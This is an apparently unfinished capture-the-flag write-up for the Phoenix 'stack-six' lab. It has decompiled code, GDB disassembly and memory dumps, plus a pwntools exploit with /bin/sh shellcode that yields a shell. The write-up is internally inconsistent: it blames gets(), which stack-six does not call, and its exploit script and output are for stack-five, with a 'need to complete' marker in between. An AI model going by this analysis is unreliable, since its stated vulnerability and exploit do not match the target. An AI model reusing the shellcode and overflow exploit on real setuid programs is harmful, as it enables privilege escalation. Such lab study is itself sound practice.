# &#35; stack-6

#### &#42; pseudocode using ghidra
```bash

undefined4 main(void)

{
  undefined4 uVar1;
  undefined *puVar2;
  undefined auStack32 [12];
  char *local_14;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  puts("Welcome to phoenix/stack-six, brought to you by https://exploit.education");
  local_14 = getenv("ExploitEducation");
  puVar2 = auStack32;
  if (local_14 == (char *)0x0) {
    errx();
    puVar2 = &stack0xffffffd0;
  }
  *(char **)(puVar2 + -0x10) = local_14;
  *(undefined4 *)(puVar2 + -0x14) = 0x804865f;
  uVar1 = greet();
  *(undefined4 *)(puVar2 + -0x10) = uVar1;
  *(undefined4 *)(puVar2 + -0x14) = 0x804866b;
  puts(*(char **)(puVar2 + -0x10));
  return 0;
}

void greet(char *param_1)

{
  size_t __n;
  size_t sVar1;
  char local_90 [128];
  size_t local_10;
  
  local_10 = strlen(param_1);
  if (127 < local_10) {
    local_10 = 127;
  }
  strcpy(local_90,what);
  __n = local_10;
  sVar1 = strlen(local_90);
  strncpy(local_90 + sVar1,param_1,__n);
  strdup(local_90);
  return;
}

```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-six
/opt/phoenix/i486/stack-six: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-six
[*] '/opt/phoenix/i486/stack-six'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```



#### &#42; how it work
#### buffer overflow on gets()
```bash
$ /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
stack-six: Please specify an environment variable called ExploitEducation
$

$ export ExploitEducation=AAAAAAAAAAAAAAA

$ /opt/phoenix/i486/stack-six
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome home, AAAAAAAAAAAAAAA

```


#### &#42; vulnerable point
```bash
#### we can overwrite local_8c variable using gets(local_8c);
```


#### &#42; stack structure
#### local_8c[136] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-six -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-six...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x0804860b <+0>:	lea    ecx,[esp+0x4]
   0x0804860f <+4>:	and    esp,0xfffffff0
   0x08048612 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048615 <+10>:	push   ebp
   0x08048616 <+11>:	mov    ebp,esp
   0x08048618 <+13>:	push   ecx
   0x08048619 <+14>:	sub    esp,0x14
   0x0804861c <+17>:	sub    esp,0xc
   0x0804861f <+20>:	push   0x80486d0
   0x08048624 <+25>:	call   0x8048390 <puts@plt>
   0x08048629 <+30>:	add    esp,0x10
   0x0804862c <+33>:	sub    esp,0xc
   0x0804862f <+36>:	push   0x804871a
   0x08048634 <+41>:	call   0x8048380 <getenv@plt>
   0x08048639 <+46>:	add    esp,0x10
   0x0804863c <+49>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804863f <+52>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08048643 <+56>:	jne    0x8048654 <main+73>
   0x08048645 <+58>:	sub    esp,0x8
   0x08048648 <+61>:	push   0x804872c
   0x0804864d <+66>:	push   0x1
   0x0804864f <+68>:	call   0x80483a0 <errx@plt>
   0x08048654 <+73>:	sub    esp,0xc
   0x08048657 <+76>:	push   DWORD PTR [ebp-0xc]
   0x0804865a <+79>:	call   0x8048585 <greet>
   0x0804865f <+84>:	add    esp,0x10
   0x08048662 <+87>:	sub    esp,0xc
   0x08048665 <+90>:	push   eax
   0x08048666 <+91>:	call   0x8048390 <puts@plt>
   0x0804866b <+96>:	add    esp,0x10
   0x0804866e <+99>:	mov    eax,0x0
   0x08048673 <+104>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048676 <+107>:	leave
   0x08048677 <+108>:	lea    esp,[ecx-0x4]
   0x0804867a <+111>:	ret
End of assembler dump.
gef>

gef> disas greet
Dump of assembler code for function greet:
   0x08048585 <+0>:	push   ebp
   0x08048586 <+1>:	mov    ebp,esp
   0x08048588 <+3>:	push   ebx
   0x08048589 <+4>:	sub    esp,0x94
   0x0804858f <+10>:	sub    esp,0xc
   0x08048592 <+13>:	push   DWORD PTR [ebp+0x8]
   0x08048595 <+16>:	call   0x80483e0 <strlen@plt>
   0x0804859a <+21>:	add    esp,0x10
   0x0804859d <+24>:	mov    DWORD PTR [ebp-0xc],eax  => local_10(length)
   0x080485a0 <+27>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485a3 <+30>:	cmp    eax,0x7f                 => 0x7f = 127
   0x080485a6 <+33>:	jbe    0x80485af <greet+42>
   0x080485a8 <+35>:	mov    DWORD PTR [ebp-0xc],0x7f
   0x080485af <+42>:	mov    eax,ds:0x8049900         => what (0x8049900 -> 0x80486c0:	"Welcome home,_080486c0")
   0x080485b4 <+47>:	sub    esp,0x8
   0x080485b7 <+50>:	push   eax
   0x080485b8 <+51>:	lea    eax,[ebp-0x8c]           => local_90[128]
   0x080485be <+57>:	push   eax
   0x080485bf <+58>:	call   0x8048370 <strcpy@plt>
   0x080485c4 <+63>:	add    esp,0x10
   0x080485c7 <+66>:	mov    ebx,DWORD PTR [ebp-0xc]  => length
   0x080485ca <+69>:	sub    esp,0xc
   0x080485cd <+72>:	lea    eax,[ebp-0x8c]
   0x080485d3 <+78>:	push   eax
   0x080485d4 <+79>:	call   0x80483e0 <strlen@plt>
   0x080485d9 <+84>:	add    esp,0x10
   0x080485dc <+87>:	lea    edx,[ebp-0x8c]           => 0xffffd5ac:	"Welcome home, "
   0x080485e2 <+93>:	add    eax,edx
   0x080485e4 <+95>:	sub    esp,0x4
   0x080485e7 <+98>:	push   ebx
   0x080485e8 <+99>:	push   DWORD PTR [ebp+0x8]
   0x080485eb <+102>:	push   eax
   0x080485ec <+103>:	call   0x80483b0 <strncpy@plt>
   0x080485f1 <+108>:	add    esp,0x10
   0x080485f4 <+111>:	sub    esp,0xc
   0x080485f7 <+114>:	lea    eax,[ebp-0x8c]            => 0xffffd5ac:	"Welcome home, ", 'A' <repeats 100 times>
   0x080485fd <+120>:	push   eax
   0x080485fe <+121>:	call   0x80483c0 <strdup@plt>
   0x08048603 <+126>:	add    esp,0x10
   0x08048606 <+129>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048609 <+132>:	leave
   0x0804860a <+133>:	ret
End of assembler dump.
gef>


gef> x/s *0x8049900
0x80486c0:	"Welcome home, "

gef> x/4xw $ebp-0xc
0xffffd62c:	0x00000064	0xffffd6f4	0xf7ffb000	0xffffd668

gef> x/s $ebp-0x8c
0xffffd5ac:	"Welcome home, ", 'A' <repeats 100 times>


gef> x/32xw $ebp-0x8c
0xffffd5ac:	0x636c6557	0x20656d6f	0x656d6f68	0x4141202c
0xffffd5bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5cc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5dc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5ec:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5fc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd60c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd61c:	0x00004141	0xf7ffb1e0	0x0000000a	0xf7f8f75f
gef>

======================================================================================================
need to complete
======================================================================================================

```

#### &#42; payload
```bash
#### local_8c[136] + sfp[4] + ret[4]
payload  = b""
payload += b"\x90"*100
payload += shellcode
payload += b"A"*13
payload += b"B"*4
payload += p32(0xffffd690)
print(len(payload))
```

#### &#42; exploit code
```bash
$ cat exp_stack5.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/stack-five"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
print(len(shellcode))

payload  = b""
payload += b"\x90"*100
payload += shellcode
payload += b"A"*13
payload += b"B"*4
payload += p32(0xffffd690)
print(len(payload))

conn = process(filename)
print( conn.recvline() )
conn.send(payload)

with open("payload", "wb") as fd:
    fd.write(payload)

conn.interactive()



$ python exp_stack5.py
23
144
[+] Starting local process '/opt/phoenix/i486/stack-five': pid 1466
Welcome to phoenix/stack-five, brought to you by https://exploit.education

[*] Switching to interactive mode
$
$
$ id
uid=1000(user) gid=1000(user) euid=505(phoenix-i386-stack-five) egid=505(phoenix-i386-stack-five) groups=505(phoenix-i386-stack-five),27(sudo),1000(user)
$
```


